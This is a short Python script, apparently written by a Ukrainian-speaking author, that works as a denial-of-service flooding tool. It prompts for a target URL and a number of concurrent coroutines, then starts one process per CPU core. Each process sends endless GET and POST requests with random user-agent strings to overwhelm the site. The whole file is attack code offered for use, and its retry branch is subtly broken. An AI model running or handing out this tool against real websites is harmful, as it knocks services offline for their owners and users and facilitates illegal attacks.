import asyncio
import aiohttp
import random
from time import sleep
from data import *
from multiprocessing import Process,cpu_count

async def ddos(url):
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                await session.get(url,headers={'user-agent':random.choice(user_agents)})
                await session.post(url,headers={'user-agent':random.choice(user_agents)})
    except:
        print("No request from "+url+" good")
        ddos()

def start_async_ddos(url,req_in_s):
    loop = asyncio.get_event_loop()
    tasks = [loop.create_task(ddos(url)) for i in range(req_in_s)]
    
    wait_tasks = asyncio.wait(tasks)
    print('\nDDOS is running...')
    loop.run_until_complete(wait_tasks)
        
if __name__ == '__main__':
    url = input('Введіть Url для DDOS сайту: ')
    req_in_s=int(input('кількість async def 800-3000: '))
    print("кількість cpu:",cpu_count())

    procs = []
    
    for i in range(cpu_count()):
        procs.append(Process(target=start_async_ddos,args=(url,req_in_s)))
    
    for proc in procs:
        proc.start()
 	       
    for proc in procs:
        proc.join()
